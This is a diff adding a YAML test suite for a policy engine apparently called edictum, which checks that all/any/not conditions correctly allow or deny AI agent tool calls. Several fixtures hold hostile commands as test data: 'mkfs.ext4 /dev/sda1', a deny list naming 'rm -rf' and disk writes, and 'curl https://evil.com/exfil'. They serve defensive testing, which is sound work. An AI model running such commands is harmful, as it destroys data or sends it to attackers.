@@ -1,0 +1,278 @@
+suite: expressions
+version: 1
+description: "Compound expression evaluation: all, any, not, and nesting"
+
+fixtures:
+  # ── all (AND) ───────────────────────────────────────────────────────
+  - id: "expr-all-001"
+    description: "all requires every sub-expression to match"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: check-all
+          type: pre
+          tool: "API"
+          when:
+            all:
+              - args.method:
+                  equals: "DELETE"
+              - args.url:
+                  starts_with: "/admin"
+          then:
+            effect: deny
+            message: "Cannot DELETE admin resources"
+
+    envelope:
+      tool_name: "API"
+      arguments:
+        method: "DELETE"
+        url: "/admin/users/123"
+
+    expected:
+      verdict: denied
+      message_contains: "admin"
+
+  - id: "expr-all-002"
+    description: "all does not match when one sub-expression fails"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: check-all
+          type: pre
+          tool: "API"
+          when:
+            all:
+              - args.method:
+                  equals: "DELETE"
+              - args.url:
+                  starts_with: "/admin"
+          then:
+            effect: deny
+            message: "Cannot DELETE admin resources"
+
+    envelope:
+      tool_name: "API"
+      arguments:
+        method: "GET"
+        url: "/admin/users/123"
+
+    expected:
+      verdict: allowed
+
+  # ── any (OR) ────────────────────────────────────────────────────────
+  - id: "expr-any-001"
+    description: "any matches when at least one sub-expression matches"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: check-any
+          type: pre
+          tool: "Bash"
+          when:
+            any:
+              - args.command:
+                  contains: "rm -rf"
+              - args.command:
+                  contains: "mkfs"
+              - args.command:
+                  contains: "> /dev/sd"
+          then:
+            effect: deny
+            message: "Destructive command detected"
+
+    envelope:
+      tool_name: "Bash"
+      arguments:
+        command: "mkfs.ext4 /dev/sda1"
+
+    expected:
+      verdict: denied
+      message_contains: "Destructive"
+
+  - id: "expr-any-002"
+    description: "any does not match when no sub-expression matches"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: check-any
+          type: pre
+          tool: "Bash"
+          when:
+            any:
+              - args.command:
+                  contains: "rm -rf"
+              - args.command:
+                  contains: "mkfs"
+              - args.command:
+                  contains: "> /dev/sd"
+          then:
+            effect: deny
+            message: "Destructive command detected"
+
+    envelope:
+      tool_name: "Bash"
+      arguments:
+        command: "echo hello"
+
+    expected:
+      verdict: allowed
+
+  # ── not ─────────────────────────────────────────────────────────────
+  - id: "expr-not-001"
+    description: "not inverts a matching expression"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: require-https
+          type: pre
+          tool: "Fetch"
+          when:
+            not:
+              args.url:
+                starts_with: "https://"
+          then:
+            effect: deny
+            message: "Only HTTPS URLs are allowed"
+
+    envelope:
+      tool_name: "Fetch"
+      arguments:
+        url: "http://insecure-api.com/data"
+
+    expected:
+      verdict: denied
+      message_contains: "HTTPS"
+
+  - id: "expr-not-002"
+    description: "not inverts a non-matching expression to allow"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: require-https
+          type: pre
+          tool: "Fetch"
+          when:
+            not:
+              args.url:
+                starts_with: "https://"
+          then:
+            effect: deny
+            message: "Only HTTPS URLs are allowed"
+
+    envelope:
+      tool_name: "Fetch"
+      arguments:
+        url: "https://secure-api.com/data"
+
+    expected:
+      verdict: allowed
+
+  # ── Deep nesting ────────────────────────────────────────────────────
+  - id: "expr-nested-001"
+    description: "Deeply nested: all containing any and not"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: complex-rule
+          type: pre
+          tool: "Bash"
+          when:
+            all:
+              - any:
+                  - args.command:
+                      contains: "curl"
+                  - args.command:
+                      contains: "wget"
+              - not:
+                  args.command:
+                    contains: "localhost"
+          then:
+            effect: deny
+            message: "External network requests are blocked"
+
+    envelope:
+      tool_name: "Bash"
+      arguments:
+        command: "curl https://evil.com/exfil"
+
+    expected:
+      verdict: denied
+      message_contains: "network"
+
+  - id: "expr-nested-002"
+    description: "Nested not exempts localhost from network block"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: complex-rule
+          type: pre
+          tool: "Bash"
+          when:
+            all:
+              - any:
+                  - args.command:
+                      contains: "curl"
+                  - args.command:
+                      contains: "wget"
+              - not:
+                  args.command:
+                    contains: "localhost"
+          then:
+            effect: deny
+            message: "External network requests are blocked"
+
+    envelope:
+      tool_name: "Bash"
+      arguments:
+        command: "curl http://localhost:3000/health"
+
+    expected:
+      verdict: allowed
